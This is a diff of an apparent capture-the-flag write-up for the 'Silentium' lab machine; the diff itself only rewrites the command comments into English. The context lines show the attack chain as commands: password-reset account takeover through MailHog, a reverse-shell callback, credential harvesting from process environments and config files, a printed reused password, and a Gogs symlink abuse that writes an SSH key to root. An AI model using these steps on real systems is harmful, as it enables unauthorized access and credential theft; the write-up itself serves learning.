@@ -47,16 +47,16 @@ Write to /root/.ssh/authorized_keys → SSH as root → Root Flag
 
 ### Host Setup
 ```bash
-# What it does: adds machine domains to /etc/hosts.
-# Why here: resolve virtual hosts during web enumeration.
+# What it does: add the target domain names to the local hosts file.
+# Why here: enable proper resolution for virtual hosts used in the attack chain.
 echo "TARGET_IP silentium.htb" | sudo tee -a /etc/hosts
 ```
 
 ### Subdomain Discovery
 
 ```bash
-# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
-# Why here: descubrir endpoints ocultos que abren la siguiente fase.
+# What it does: perform subdomain/API brute-forcing with a wordlist.
+# Why here: discover hidden endpoints that facilitate the next stage of the attack.
 gobuster vhost -u http://silentium.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
   --append-domain
 ```
@@ -64,16 +64,16 @@ gobuster vhost -u http://silentium.htb -w /usr/share/seclists/Discovery/DNS/subd
 **Result:** `staging.silentium.htb` discovered.
 
 ```bash
-# What it does: adds machine domains to /etc/hosts.
-# Why here: resolve virtual hosts during web enumeration.
+# What it does: add the target domain names to the local hosts file.
+# Why here: enable proper resolution for virtual hosts used in the attack chain.
 echo "TARGET_IP staging.silentium.htb" | sudo tee -a /etc/hosts
 ```
 
 ### API Endpoint Enumeration
 
 ```bash
-# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
-# Why here: descubrir endpoints ocultos que abren la siguiente fase.
+# What it does: perform subdomain/API brute-forcing with a wordlist.
+# Why here: discover hidden endpoints that facilitate the next stage of the attack.
 ffuf -u http://staging.silentium.htb/api/v1/FUZZ \
   -w /usr/share/seclists/Discovery/Web-Content/api-endpoints-res.txt \
   -fc 404 -fw 2
@@ -112,8 +112,8 @@ Use token to reset password → Account takeover
 ### Step 1 — Request Password Reset
 
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send an HTTP request to the target API or service.
+# Why here: interact with the application logic or trigger a specific vulnerability in the flow.
 curl -X POST http://staging.silentium.htb/api/v1/auth/forgot-password \
   -H "Content-Type: application/json" \
   -d '{"email":"ben@silentium.htb"}'
@@ -124,8 +124,8 @@ curl -X POST http://staging.silentium.htb/api/v1/auth/forgot-password \
 MailHog typically runs on port `8025`. Access the web UI:
 
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send an HTTP request to the target API or service.
+# Why here: interact with the application logic or trigger a specific vulnerability in the flow.
 curl http://staging.silentium.htb:8025/api/v2/messages
 ```
 
@@ -134,8 +134,8 @@ curl http://staging.silentium.htb:8025/api/v2/messages
 ### Step 3 — Reset Password
 
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send an HTTP request to the target API or service.
+# Why here: interact with the application logic or trigger a specific vulnerability in the flow.
 curl -X POST http://staging.silentium.htb/api/v1/auth/reset-password \
   -H "Content-Type: application/json" \
   -d '{
@@ -152,8 +152,8 @@ curl -X POST http://staging.silentium.htb/api/v1/auth/reset-password \
 ### Step 4 — Login
 
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send an HTTP request to the target API or service.
+# Why here: interact with the application logic or trigger a specific vulnerability in the flow.
 curl -X POST http://staging.silentium.htb/api/v1/auth/login \
   -H "Content-Type: application/json" \
   -d '{"email":"ben@silentium.htb","password":"NuevaPassword123!"}'
@@ -223,14 +223,14 @@ connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 4444
 
 ```bash
 # Check hostname
-# What it does: muestra el hostname actual.
-# Why here: distinguir si la shell esta en host, contenedor o nodo pivote.
+# What it does: display the current system hostname.
+# Why here: confirm the execution environment (host vs. container).
 hostname
 # CONTAINER_IP
 
 # Check OS
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: display the contents of a file.
+# Why here: extract sensitive information, configuration, or credentials.
 cat /etc/os-release
 # Alpine Linux
 
@@ -267,8 +267,8 @@ arp -a
 Process environment variables often contain credentials, API keys, and configuration secrets:
 
 ```bash
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: display the contents of a file.
+# Why here: extract sensitive information, configuration, or credentials.
 cat /proc/1/environ | tr '\0' '\n'
 ```
 
@@ -287,13 +287,13 @@ cat /proc/1/environ | tr '\0' '\n'
 ps aux
 
 # Check mounted filesystems
-# What it does: monta un sistema de archivos remoto o local.
-# Why here: inspeccionar archivos como si estuvieran en local.
+# What it does: list active mount points.
+# Why here: inspect for sensitive volumes or host filesystem mounts.
 mount
 
 # Check for interesting files
-# What it does: searches the filesystem with the specified filters.
-# Why here: locate credentials, binaries, configs or writable paths.
+# What it does: search for specific files on the system.
+# Why here: locate sensitive binaries, configurations, or writable paths for exploitation.
 find / -type f -name "*.env" -o -name "*.conf" -o -name "*.ini" 2>/dev/null
 ```
 
@@ -310,8 +310,8 @@ The `SMTP_PASSWORD` discovered in the container environment variables was **reus
 - **Password:** `r04D!!_R4ge`
 
 ```bash
-# What it does: opens an SSH session or tunnel with the specified options.
-# Why here: obtain interactive shell or pivot to an internal service.
+# What it does: establish an SSH connection or tunnel.
+# Why here: obtain an interactive shell or bypass local network restrictions.
 ssh ben@TARGET_IP
 # Password: r04D!!_R4ge
 ```
@@ -356,8 +356,8 @@ Gogs is a self-hosted Git service similar to GitHub. It provides web-based repos
 ### Gogs Configuration
 
 ```bash
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: display the contents of a file.
+# Why here: extract sensitive information, configuration, or credentials.
 cat /opt/gogs/gogs/custom/conf/app.ini
 ```
 
@@ -395,8 +395,8 @@ SSH as root → Root Flag
 ### Step 1 — SSH Tunnel
 
 ```bash
-# What it does: opens an SSH session or tunnel with the specified options.
-# Why here: obtain interactive shell or pivot to an internal service.
+# What it does: establish an SSH connection or tunnel.
+# Why here: obtain an interactive shell or bypass local network restrictions.
 ssh -L 8080:127.0.0.1:3001 ben@TARGET_IP
 ```
 
@@ -416,8 +416,8 @@ Create a new repository called `pwn` under the `123` user account.
 ### Step 4 — Generate SSH Key Pair
 
 ```bash
-# What it does: opens an SSH session or tunnel with the specified options.
-# Why here: obtain interactive shell or pivot to an internal service.
+# What it does: establish an SSH connection or tunnel.
+# Why here: obtain an interactive shell or bypass local network restrictions.
 ssh-keygen -t rsa -f /tmp/htb_key -N ""
 ```
 
@@ -468,8 +468,8 @@ TOKEN="<API_TOKEN>"
 PUB=$(base64 -w0 /tmp/htb_key.pub)
 
 # Write public key to symlink path via API
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send an HTTP request to the target API or service.
+# Why here: interact with the application logic or trigger a specific vulnerability in the flow.
 curl -X PUT "http://127.0.0.1:8080/api/v1/repos/123/pwn/contents/link" \
   -H "Content-Type: application/json" \
   -H "Authorization: token $TOKEN" \
@@ -488,8 +488,8 @@ curl -X PUT "http://127.0.0.1:8080/api/v1/repos/123/pwn/contents/link" \
 ### Step 8 — SSH as Root
 
 ```bash
-# What it does: opens an SSH session or tunnel with the specified options.
-# Why here: obtain interactive shell or pivot to an internal service.
+# What it does: establish an SSH connection or tunnel.
+# Why here: obtain an interactive shell or bypass local network restrictions.
 ssh -i /tmp/htb_key root@TARGET_IP
 ```
 
@@ -513,8 +513,8 @@ root@silentium:~# cat /root/root.txt
 
 ```bash
 # Search for configuration files
-# What it does: searches the filesystem with the specified filters.
-# Why here: locate credentials, binaries, configs or writable paths.
+# What it does: search for specific files on the system.
+# Why here: locate sensitive binaries, configurations, or writable paths for exploitation.
 find / -name "*.yml" -o -name "*.yaml" -o -name "docker-compose*" 2>/dev/null
 
 # Check for Docker socket
@@ -529,8 +529,8 @@ ls -la /run/secrets/ 2>/dev/null
 ### Gogs Version Check
 
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send an HTTP request to the target API or service.
+# Why here: interact with the application logic or trigger a specific vulnerability in the flow.
 curl -s http://127.0.0.1:3001/explore/repos \
   | grep -i "gogs\|version"
 ```
@@ -622,8 +622,8 @@ git commit -m "Add symlink"
 git push
 
 # 3. Write content via API
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send an HTTP request to the target API or service.
+# Why here: interact with the application logic or trigger a specific vulnerability in the flow.
 curl -X PUT "http://GOGS_HOST/api/v1/repos/USER/REPO/contents/path_in_repo" \
   -H "Content-Type: application/json" \
   -H "Authorization: token $TOKEN" \
